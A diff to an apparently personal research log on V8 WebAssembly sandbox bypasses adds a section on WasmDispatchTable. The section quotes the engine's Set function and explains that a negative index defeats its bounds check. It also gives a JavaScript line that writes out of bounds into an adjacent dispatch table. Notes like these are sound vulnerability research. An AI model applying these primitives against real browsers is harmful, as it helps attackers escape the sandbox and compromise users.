@@ -24,6 +24,11 @@ setField(t1, kWasmTableObjectTypeOffset, t0_type);
 ![Idea1](table-changing-internal-pointer.jpg)
 
 
+- Using Claude: 
+
+![Claude](claude-visuallization.png)
+
+
 ## Day 2: call_ref
 
 - **call_ref** used for calling a function by global value, it litterally looks like that:
@@ -47,3 +52,42 @@ By overwritting `raw_type` of global variable, we can get confuse input type of 
 ```js
 setField(getPtr(fn), kWasmGlobalObjectRawTypeOffset, new_type);
 ```
+
+## Day 3: WasmDispatchTable
+
+- issues: https://chromium-review.googlesource.com/c/v8/v8/+/5701137
+
+- Using negative number can bypass `SBXCHECK_LT` in `WasmDispatchTable::Set`, because both `index` and `length()` are represented in `int` type. 
+
+```cpp
+void WasmDispatchTable::Set(int index, Tagged<Object> ref, Address call_target,
+                            int sig_id) {
+  if (ref == Smi::zero()) {
+    DCHECK_EQ(kNullAddress, call_target);
+    Clear(index);
+    return;
+  }
+
+  printf("\033[1;31mWasmDispatchTable::Set\033[0m\n");
+
+  SBXCHECK_LT(index, length());
+  DCHECK(IsWasmApiFunctionRef(ref) || IsWasmTrustedInstanceData(ref));
+  DCHECK_EQ(ref == Smi::zero(), call_target == kNullAddress);
+  const int offset = OffsetOf(index);
+  WriteProtectedPointerField(offset + kRefBias, Cast<TrustedObject>(ref));
+  CONDITIONAL_WRITE_BARRIER(*this, offset + kRefBias, ref,
+                            UPDATE_WRITE_BARRIER);
+  WriteField<Address>(offset + kTargetBias, call_target);
+  WriteField<int>(offset + kSigBias, sig_id);
+}
+```
+
+- Example:
+```js
+// call table set
+// check bypassed, write @ index -7 -> writes exactly into table_v_ll dispatch table!
+table_v_ls.set(0xfffffff9, writer);
+```
+Full script in [dispatch-table.js](dispatch-table.js)
+
+- So what is the purpose of `WasmDispatchTable`?
